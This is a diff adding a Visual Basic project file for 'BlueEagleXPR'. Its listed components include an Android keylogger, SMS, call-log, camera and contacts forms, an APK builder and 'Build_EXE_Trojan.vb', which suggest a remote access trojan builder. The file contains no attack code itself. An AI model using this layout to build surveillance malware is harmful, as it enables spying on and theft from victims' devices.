@@ -1,0 +1,472 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>
+    </ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{B99E10A9-CF29-433A-8672-69EA88FE92E3}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <StartupObject>BlueEagleXPR.My.MyApplication</StartupObject>
+    <RootNamespace>BlueEagleXPR</RootNamespace>
+    <AssemblyName>BlueEagleXPR</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>WindowsForms</MyType>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DocumentationFile>BlueEagleXPR.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>BlueEagleXPR.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>Off</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>imageedit_1_5226222682.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>My Project\app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="RestSharp">
+      <HintPath>..\..\..\TCPP XPR Installer\TCP_XPR_Installer\RestSharp.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="AxWMPLib" />
+    <Import Include="etonyps" />
+    <Import Include="Microsoft.VisualBasic" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Data" />
+    <Import Include="System.Drawing" />
+    <Import Include="System.Diagnostics" />
+    <Import Include="System.IO.Compression" />
+    <Import Include="System.Windows.Forms" />
+    <Import Include="WMPLib" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="About.Designer.vb">
+      <DependentUpon>About.vb</DependentUpon>
+    </Compile>
+    <Compile Include="About.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Android_appmanager.Designer.vb">
+      <DependentUpon>Android_appmanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Android_appmanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Android_calllog.Designer.vb">
+      <DependentUpon>Android_calllog.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Android_calllog.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Android_cam.Designer.vb">
+      <DependentUpon>Android_cam.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Android_cam.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Android_chat.Designer.vb">
+      <DependentUpon>Android_chat.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Android_chat.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Android_contactsmanager.Designer.vb">
+      <DependentUpon>Android_contactsmanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Android_contactsmanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Android_FileDownloader.Designer.vb">
+      <DependentUpon>Android_FileDownloader.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Android_FileDownloader.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Android_filemanager.Designer.vb">
+      <DependentUpon>Android_filemanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Android_filemanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Android_File_editor.Designer.vb">
+      <DependentUpon>Android_File_editor.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Android_File_editor.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Android_keylogger.Designer.vb">
+      <DependentUpon>Android_keylogger.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Android_keylogger.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Android_sms.Designer.vb">
+      <DependentUpon>Android_sms.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Android_sms.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Build Apk.Designer.vb">
+      <DependentUpon>Build Apk.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Build Apk.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Build_EXE_Trojan.vb" />
+    <Compile Include="Class1.vb" />
+    <Compile Include="FileManager.Designer.vb">
+      <DependentUpon>FileManager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FileManager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.vb">
+      <DependentUpon>Form1.vb</DependentUpon>
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Loading.Designer.vb">
+      <DependentUpon>Loading.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Loading.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Module1.vb" />
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My Project\Application.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Application.myapp</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Notification.Designer.vb">
+      <DependentUpon>Notification.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Notification.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="RDP.Designer.vb">
+      <DependentUpon>RDP.vb</DependentUpon>
+    </Compile>
+    <Compile Include="RDP.vb">
+      <SubType>Form</SubType>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="About.resx">
+      <DependentUpon>About.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Android_appmanager.resx">
+      <DependentUpon>Android_appmanager.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Android_calllog.resx">
+      <DependentUpon>Android_calllog.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Android_cam.resx">
+      <DependentUpon>Android_cam.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Android_chat.resx">
+      <DependentUpon>Android_chat.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Android_contactsmanager.resx">
+      <DependentUpon>Android_contactsmanager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Android_FileDownloader.resx">
+      <DependentUpon>Android_FileDownloader.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Android_filemanager.resx">
+      <DependentUpon>Android_filemanager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Android_File_editor.resx">
+      <DependentUpon>Android_File_editor.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Android_keylogger.resx">
+      <DependentUpon>Android_keylogger.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Android_sms.resx">
+      <DependentUpon>Android_sms.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Build Apk.resx">
+      <DependentUpon>Build Apk.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FileManager.resx">
+      <DependentUpon>FileManager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Loading.resx">
+      <DependentUpon>Loading.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <SubType>Designer</SubType>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Notification.resx">
+      <DependentUpon>Notification.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="RDP.resx">
+      <DependentUpon>RDP.vb</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="My Project\app.manifest">
+      <SubType>Designer</SubType>
+    </None>
+    <None Include="Resources\Patch-release.apk" />
+    <None Include="Resources\Patch-StaminaMode-release.apk" />
+    <None Include="My Project\Application.myapp">
+      <Generator>MyApplicationCodeGenerator</Generator>
+      <LastGenOutput>Application.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="My Project\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\OBU.inf" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Terminal.inf" />
+  </ItemGroup>
+  <ItemGroup>
+    <COMReference Include="Shell32">
+      <Guid>{50A7E9B0-70EF-11D1-B75A-00A0C90564FE}</Guid>
+      <VersionMajor>1</VersionMajor>
+      <VersionMinor>0</VersionMinor>
+      <Lcid>0</Lcid>
+      <WrapperTool>tlbimp</WrapperTool>
+      <Isolated>False</Isolated>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </COMReference>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\imageedit_1_5226222682.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\NAV.ICO" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pdf.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_1.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_5.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_9.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_10.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_12.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_25.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_27.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_43.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_151.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_152.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_153.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_154.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_181.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_192.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_223.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_255.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_310.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_314.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_337.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_512.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_8240.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_16717.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_16739.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_16767.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_16781.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_16824.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_16825.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\USER32_100.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Download.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Open Folder.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Redo.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Up.gif" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="imageedit_1_5226222682.ico" />
+    <None Include="Resources\Android2.png" />
+    <None Include="Resources\WindowsXP-jar.png" />
+    <None Include="Resources\WindowsXP.png" />
+    <None Include="Resources\Windows10-jar.png" />
+    <None Include="Resources\Windows10.png" />
+    <None Include="Resources\Windows7-jar.png" />
+    <None Include="Resources\Windows7.png" />
+    <None Include="Resources\Windows Vista-jar.png" />
+    <None Include="Resources\Windows Vista.png" />
+    <None Include="Resources\unknowen-jar.png" />
+    <None Include="Resources\unknowen.png" />
+    <None Include="Resources\mac-c.png" />
+    <None Include="Resources\linux.png" />
+    <None Include="Resources\jarBuilder_FinalBuild.jar" />
+    <None Include="Resources\backxx.png" />
+    <None Include="Resources\back.png" />
+    <None Include="Resources\Con-Process_CONF.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <Folder Include="bin\" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Windows.Installer.3.1">
+      <Visible>False</Visible>
+      <ProductName>Windows Installer 3.1</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
